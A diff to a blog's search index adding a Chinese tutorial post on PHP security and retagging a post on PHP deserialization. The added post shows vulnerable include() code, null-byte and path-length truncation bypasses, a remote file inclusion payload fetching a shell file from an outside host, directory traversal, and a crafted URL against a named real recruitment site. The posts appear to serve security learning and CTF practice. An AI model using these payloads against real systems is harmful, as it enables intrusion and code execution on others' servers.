@@ -1,6 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[PHP安全]]></title>
+    <url>%2F2019%2F11%2F04%2FPHP%E5%AE%89%E5%85%A8%2F</url>
+    <content type="text"><![CDATA[文件包含漏洞常见的导致文件包含漏洞的函数如下 1include(),include_once(),require(),require_once(),fopen(),readfile() 当使用 1include(),include_once(),require(),require_once() 包含一个新文件时，该文件作为PHP代码去执行。也就是说如果被包含的是txt文件，图片文件，远程url也会被当做PHP代码去执行 想要利用成功文件包含漏洞应满足 12include()等函数通过动态变量的方式引入需要包含的文件用户能够控制该动态变量 本地文件包含123456&lt;?php $file = $_GET['file']; if(file_exists('./home/bh/'.$file.'.php'))&#123; include './home/bh/'.$file.'.php'; &#125; ?&gt; 有这一段代码 用户能够控制file 如果我传入 1?file = ../info.txt 则这段代码就变成了 1include './home/../info.txt.php'; 但是被包含的文件info.txt.php文件是不存在的 这时候我们可以利用已下几种方法去绕过 1234567%00截断../info.txt%00(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)径长度截断：../info.txt/././././././.[…]/./././././.(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256) 远程文件包含如果PHP配置选项 allow_url_include为on则可以远程加载文件 实战中不常见(可能怪我太菜 我很少遇到) 123&lt;?php include $_GET['url']; ?&gt; 1?url=https://poc10.cn/shell.php shell.txt内容为&lt;?php phpinfo(); ?&gt;会直接打印出phpinfo 远程文件包含还有一种PHP输入输出流的利用方式，可直接执行POST代码 (php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）) 在ctf中比较常见 目录遍历文件包含漏洞也能读取敏感文件或服务器端脚本的源代码 使用../../的方式返回上层目录这种方式被称为目录遍历 例如有如下代码 1234&lt;?php $file = $_GET['file']; include "$file";?&gt; 这里读取了 网站根目录之外的文件 目录遍历是一种跨越目录读取文件的方法，当PHP没有配置open_basedir时 文件包含漏洞可以访问任意文件。 当设置了open_basedir时 open_basedir作用是在某个特定目录下PHP能打开的文件 这就解决了跨目录读取文件的问题。 变量覆盖漏洞1https://recruit.vip.com/psc/ps/EMPLOYEE/HRMS/c/HRS_HRAM.HRS_APP_SCHJOB.GBL?languageCd=ZHS&amp;amp;LoginUser=VABIABPABOABUABTABLABOABGABIAB&amp;amp;PortalActualURL=https://www.baidu.com;PortalRegistryName=EMPLOYEE&amp;amp;PortalServletURI=https%3a%2f%2frecruit.vip.com%2fpsp%2fps%2f&amp;amp;PortalURI=https%3a%2f%2frecruit.vip.com%2fpsc%2fps%2f&amp;amp;PortalHostNode=HRMS&amp;amp;NoCrumbs=yes&amp;amp;PortalKeyStruct=yes]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[PHP反序列化漏洞]]></title>
     <url>%2F2019%2F09%2F19%2FPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
     <content type="text"><![CDATA[序列化和反序列化的概念序列化就是将一个对象转换成字符串。字符串包括 属性名 属性值 属性类型和该对象对应的类名。反序列化则相反将字符串恢复成对象 对象的序列化利于对象的保存和传输 也可以让多个文件共享对象。 ctf很多题型也都是考察PHP反序列化的相关知识 PHP的序列化序列化函数serialize() 首先我创一个Ctf类 里面写了三个属性 后创建了一个ctfer对象 将Ctf类里的信息进行了改变。如果后面还要用到这个对象，就可以先将这个对象进行实例化。用的时候在反序列化出来就ok了 12345678O:3:"Ctf":3&#123;s:4:"flag";s:13:"flag&#123;abedyui&#125;";s:4:"name";s:7:"Sch0lar";s:3:"age";s:2:"18";&#125;O代表对象 因为我们序列化的是一个对象 序列化数组则用A来表示3代表类名字占三个字符 s代表字符串4代表属性名长度flag属性名s:13:"flag&#123;abedyui&#125;" 字符串 属性值长度 属性值 serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，__sleep()方法会先被调用，然后才执行序列化操作。 可以再__sleep()方法里可以决定哪些属性被序列化 如果没有__sleep()方法则默认序列化所有属性 上图__sleep()方法使flag age 属性序列化 name并没有被序列化 PHP的反序列化反序列化函数unserialize() 反序列化就是将一个序列化的字符串，还原回去 与 序列化函数类似 unserialize() 会检查是否存在一个 __wakeup()魔术方法 如果存在则会先调用__wakeup()方法 可以再__wakeup()方法中对属性进行初始化或者改变。 反序列化之前重新给flag属性赋值 ctf当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。 把1写成2 达到绕过wakeup()效果]]></content>
@@ -8,9 +19,9 @@
         <category>web安全</category>
       </categories>
       <tags>
+        <tag>PHP</tag>
         <tag>CTF</tag>
         <tag>序列化</tag>
-        <tag>PHP</tag>
       </tags>
   </entry>
   <entry>
